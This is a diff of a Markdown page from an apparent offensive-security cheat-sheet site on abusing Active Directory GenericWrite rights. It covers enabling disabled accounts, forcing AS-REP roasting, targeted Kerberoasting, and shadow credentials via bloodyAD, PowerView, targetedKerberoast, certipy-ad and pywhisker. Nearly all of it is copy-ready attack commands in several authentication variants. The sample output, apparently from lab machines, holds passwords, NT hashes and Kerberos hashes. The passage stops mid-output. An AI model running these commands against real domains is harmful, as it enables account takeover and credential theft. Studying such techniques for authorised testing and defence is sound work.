@@ -1,28 +1,128 @@
 ---
 title: "GenericWrite"
-tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows", "Disabled Account"]
+tags: ["Active Directory", "GenericWrite", "Asreproast", "Credential Dumping", "Disabled Account", "Enable Account", "Genericwrite", "Kerberoasting", "Pass-The-Ticket", "Powerview", "Shadow Credentials", "Ticket Granting Ticket", "Windows"]
 ---
 
-### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User
+{{< filter_buttons >}}
+
+### Enable Disabled Account
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
-#### 1. Enable Account \[Optional\]
-
-```console
-sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE
+```console {class="password"}
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> remove uac <TARGET_USER> -f ACCOUNTDISABLE
 ```
 
-#### 2. Add UF_DONT_REQUIRE_PREAUTH bit
+```console {class="ntlm"}
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> remove uac <TARGET_USER> -f ACCOUNTDISABLE
+```
 
-```console
-sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> remove uac <TARGET_USER> -f ACCOUNTDISABLE
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> remove uac <TARGET_USER> -f ACCOUNTDISABLE
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> remove uac <TARGET_USER> -f ACCOUNTDISABLE
 ```
 
 {{< /tabcontent >}}
+{{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
+{{< tab set1-2 tab1 active >}}powershell{{< /tab >}}{{< tab set1-2 tab2 >}}powerview{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
+
+#### 1. Import Module
+
+```console
+Import-Module ActiveDirectory
+```
+
+#### 2. Enable Account
+
+```console
+Enable-ADAccount -Identity "<TARGET_USER>"
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1-2 tab2 >}}
+
+#### 1. Import PowerView
+
+```console
+. .\PowerView.ps1
+```
+
+#### 2. Enable Account
+
+```console
+Set-DomainObject -Identity "<TARGET_USER>" -XOR @{useraccountcontrol=2} -Verbose
+```
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+
+### Add UF_DONT_REQUIRE_PREAUTH to Target User
+
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
+{{< tab set2 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. Add UF_DONT_REQUIRE_PREAUTH bit
+
+```console {class="password"}
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+```console {class="ntlm"}
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+#### 2. AS-REP Roasting
+
+```console
+impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ impacket-GetNPUsers 'corp.local/user' -no-pass -dc-ip 172.16.1.5
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+$krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
 
 #### 1. Import PowerView
 
@@ -32,7 +132,6 @@ sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k
 
 ```console {class="sample-code"}
 PS C:\programdata> . .\PowerView.ps1
-. .\PowerView.ps1
 ```
 
 #### 2. Check Target User
@@ -50,29 +149,15 @@ Name                           Value
 NORMAL_ACCOUNT                 512
 ```
 
-#### 3. Create a Cred Object (runas) \[Optional\]
+#### 3. Add UF_DONT_REQUIRE_PREAUTH bit
 
 ```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 4. Add UF_DONT_REQUIRE_PREAUTH bit
-
-```console
-Set-DomainObject -Identity '<TARGET_USER>' -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
+Set-DomainObject -Identity '<TARGET_USER>' -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -C
-Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
+PS C:\programdata> Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose
+Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose
 VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
 VERBOSE: [Get-Domain] Extracted domain 'corp.local' from -Credential
 VERBOSE: [Get-DomainSearcher] search base: 
@@ -84,10 +169,10 @@ VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for
 object 'user'
 ```
 
-#### 5. AS-REP Roasting (From Linux)
+#### 4. AS-REP Roasting
 
 ```console
-impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC>
+impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -102,31 +187,81 @@ $krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
 
 ---
 
-### Abuse #2 : Targeted Kerberoast
+### Targeted Kerberoasting
 
-{{< tab set2 tab1 >}}Linux{{< /tab >}}
-{{< tab set2 tab2 >}}Windows{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+{{< tab set3 tab1 >}}Linux{{< /tab >}}
+{{< tab set3 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
-python3 targetedKerberoast.py -v -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
+sudo ntpdate -s <DC_IP> && python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
 ```
 
 ```console {class="sample-code"}
-$ python3 targetedKerberoast.py -v -d 'ADMINISTRATOR.HTB' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip '10.129.255.215'
+$ sudo ntpdate -s 10.129.31.215 && python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip '10.129.31.215'
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
-[VERBOSE] SPN added successfully for (ethan)
 [+] Printing hash for (ethan)
-$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.HTB/ethan*$719ae93a160c94f2c6d7177cee77e7fb$5181256049f460e6bf16edef0850de21dc667b92081510623af531d8595c094d16038a9ce3cce9f073cf0aa1af4e622e87a44455724f6ef0c5aeb8e26f0c88b07712bc1cdbf34f7019c7a2b2397cd998db1e488b31bf51ebd2f9b6fde668d9713a4a7039e7cc02804e5493d95bac27bec7e8531e40d5afeb87523cf0c0d647b8b83d5fb29ad58f43a19f9c9f5d57b4429d817ea966c3296997b1241ba0c13fff9ec4d05c312db763f351f55bb76bddcf7e21ef284a8f4e84ea63ce377ae098a370c5ffe5b676116ca2d8fe2beec46af5d03ce8c6dd913e4dae37276153cfaf4e69d7e4ea2bdded3f75b3a51b8c57b408b332dc6878326b0276d85e5ff64a2dadbbd761e9f1346db7ab9cb8ac27afc819e89a5228b9bca828f3e1f360990cd60e3465e853347bcf425e8b713a40e3df276456b3ffd98a6ecc2daba5857055489f980725aa1d94cab0efff2b48cb115ea0b210865c5b938669c469d9d9c155af141044069780ff5ab1289d9f1b49e567a8162b4db28bd366a810c25b9164bd40a495172bf0b67ce52ff69b0f01d4bdfb37610bf19400d67c43efedbe4f24a5ce328758acdfc3f0ce6fc23548bb43e2c7f12d50e7a88ee61c64fabd03987102325f8a6d7a3a2a0ce480e0e2496ff72d4839ab3552053c8275debfbc005011b4bc0f9ffe50696aaba045e298712e4794e437fe6fe38f4b1bf1d4d48fca08721929a865021044bc5bd427a3a4fda1b0fc00d0ac6462e0a421600f3007f8b7976bd33a5ee9fa701d078a7f3f3b3417d025029a12e9155377bf17e8a64ddfb61f23752122e8094a7064c9aae2da4ada73e34ff2c24f3f83239057910e42abc14ad0a2bb7986971b21d8efadf205a12ac5379552d28dc6781fced2699a8b086d82ed5ff96a1bf34491707850533f550b287b34b486526f3008e5bd19b03cd6fad3f0a4cde95294525f4422abd90b7f4c51ecfc0590a74c50e71406be843371877385079796fdfbef564a3bc76cd14c2351614d8e07767997027aabc27e7132976691bfe6229b935d78922e7439fedeff25f58b2a06e24549a6b95913d267371e79f632f4c34b42de9bbd058102f36b790bcb376ed3ef528c5dca3daeaa474e627a23079e1d2e97bc152e87967253b958a76c41e814c9bebe93ff157ee326e29916a137dbc957c4c965d2e717f1aac0be2d6e2f9b8cf2d143d540484a68454580572fd054010102dbdefd1f21f9c2748d0bd314224c22de492e754285c0379894f4573583539bd74c0afe912114d8154bad5cf28cdf0983a0819a609981ff54285ca4d60abed3c4aa2c3536a4830142f614770a9aa93fff4ea8ae2344b0657ae11912b7301cc6555e71ba9e958c15d862de3f09e069b477044a09c66835908fb4423bff92f23fd2bf4b93f305bef94abc159cba3568dc1808228794d5a85afaaa4ad39d515772491856ed28abdb36901edf1f2f8d70fc15a089a543a70db0e2800a757af8a8312551e91e3996728e1e0139acfafae76f4943cef96632054ab598d1d15d
-[VERBOSE] SPN removed successfully for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$---[SNIP]---
+```
+
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC_IP> && python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H '<HASH>' --dc-ip '<DC_IP>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.31.215 && python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -H 'EB200A2583A88ACE2983EE5CAA520F31' --dc-ip '10.129.31.215'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$---[SNIP]---
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --dc-host '<DC>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.31.215 && python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -k --dc-host 'dc.administrator.htb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$---[SNIP]---
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H '<HASH>' -k --dc-host '<DC>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.31.215 && python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -H 'EB200A2583A88ACE2983EE5CAA520F31' -k --dc-host 'dc.administrator.htb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$---[SNIP]---
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -k --dc-host '<DC>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.31.215 && python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -k --dc-host 'dc.administrator.htb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$---[SNIP]---
 ```
 
 <small>*Ref: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab2 >}}
+{{< tabcontent set3 tab2 >}}
 
 #### 1. Import PowerView
 
@@ -134,211 +269,532 @@ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.HTB/ethan*$719ae93a160c94f2c6
 . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (runas) \[Optional\]
+#### 2. Add SPN to Target
 
 ```console
-$username = '<DOMAIN>\<USER>'
+setspn -a '<SPN>' '<DOMAIN>\<TARGET_USER>'
 ```
 
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Add a SPN
-
-```console
-# eg. MSSQLSvc/example.com:1433
-setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
-```
-
-#### 4. Check
+#### 3. Check
 
 ```console
 Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
 ```
 
-#### 5. Get the SPN
+#### 4. Get the SPN
 
 ```console
-Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
+Get-DomainSPNTicket -SPN '<SPN>'
 ```
 
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #3: Shadow Credential
+### Shadow Credential
 
-{{< tab set3 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set3 tab1 >}}
+{{< tab set4 tab1 >}}Linux{{< /tab >}}
+{{< tab set4 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+{{< tab set4-1 tab1 active >}}certipy-ad{{< /tab >}}{{< tab set4-1 tab2 >}}pywhisker{{< /tab >}}
+{{< tabcontent set4-1 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
-certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ certipy-ad shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
-[*] Targeting user 'management_svc'
+[*] Targeting user 'edward.martin'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
-[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
-[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
-[*] Authenticating as 'management_svc' with the certificate
+[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
+[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
 [*] Certificate identities:
 [*]     No identities found in this certificate
-[*] Using principal: 'management_svc@certified.htb'
+[*] Using principal: 'edward.martin@haze.htb'
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saving credential cache to 'management_svc.ccache'
-File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
-[*] Wrote credential cache to 'management_svc.ccache'
-[*] Trying to retrieve NT hash for 'management_svc'
-[*] Restoring the old Key Credentials for 'management_svc'
-[*] Successfully restored the old Key Credentials for 'management_svc'
-[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
+[*] Saving credential cache to 'edward.martin.ccache'
+File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
 certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ certipy-ad shadow auto -username 'management_svc@CERTIFIED.HTB' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
-[*] Targeting user 'ca_operator'
+[*] Targeting user 'edward.martin'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
-[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
-[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
-[*] Authenticating as 'ca_operator' with the certificate
+[*] Key Credential generated with DeviceID '27690c0aa0d54edaa91a2abc456f98a0'
+[*] Adding Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '27690c0aa0d54edaa91a2abc456f98a0' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
 [*] Certificate identities:
 [*]     No identities found in this certificate
-[*] Using principal: 'ca_operator@certified.htb'
+[*] Using principal: 'edward.martin@haze.htb'
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saving credential cache to 'ca_operator.ccache'
-[*] Wrote credential cache to 'ca_operator.ccache'
-[*] Trying to retrieve NT hash for 'ca_operator'
-[*] Restoring the old Key Credentials for 'ca_operator'
-[*] Successfully restored the old Key Credentials for 'ca_operator'
-[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
+[*] Saving credential cache to 'edward.martin.ccache'
+File 'edward.martin.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
 
-```console
-# Kerberos
-sudo ntpdate -s <DC_IP> && certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -ldap-scheme ldap -ns <DC_IP> -dc-ip <DC_IP>
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -p <PASSWORD> -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s 10.129.232.31 && certipy-ad shadow auto -username oorend@REBOUND.HTB -password '1GR8t@$$4u' -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -p 'Password123!' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] KRB5CCNAME environment variable not set
-[*] Targeting user 'winrm_svc'
+[*] Targeting user 'edward.martin'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
-[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
-[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
-[*] Authenticating as 'winrm_svc' with the certificate
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
 [*] Certificate identities:
 [*]     No identities found in this certificate
-[*] Using principal: 'winrm_svc@rebound.htb'
+[*] Using principal: 'edward.martin@haze.htb'
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saving credential cache to 'winrm_svc.ccache'
-[*] Wrote credential cache to 'winrm_svc.ccache'
-[*] Trying to retrieve NT hash for 'winrm_svc'
-[*] Restoring the old Key Credentials for 'winrm_svc'
-[*] Successfully restored the old Key Credentials for 'winrm_svc'
-[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
 
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -k -account edward.martin -target DC01.haze.htb -dc-host DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '60ceba8fb2f14695975a2e8eb58e58d8'
+[*] Adding Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '60ceba8fb2f14695975a2e8eb58e58d8' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4-1 tab2 >}}
+
+#### 1. Add Shadow Credentials
+
+```console {class="password"}
+# Password
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="ntlm"}
+# NTLM
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py --action add -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' --dc-ip 10.129.232.50 -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
